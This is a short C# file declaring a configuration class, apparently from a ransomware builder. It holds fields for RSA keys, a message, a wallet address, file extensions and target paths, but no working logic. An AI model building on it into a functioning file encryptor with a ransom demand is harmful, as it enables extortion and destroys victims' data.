using System.Collections.Generic;


namespace Client_Builder.Misc
{
    internal class EncryptionInformation
    {
        public string publicRSAServerKey { get; set; }
        public string privateRSAServerKey { get; set; }
        public bool isEncrypted { get; set; }
        public string msg { get; set; }
        public string wallet { get; set; }
        public bool subfolders { get; set; }
        public bool checkExtensions { get; set; }
        public List<string> extensionFile { get; set; }
        public List<string> paths { get; set; }
    }
}
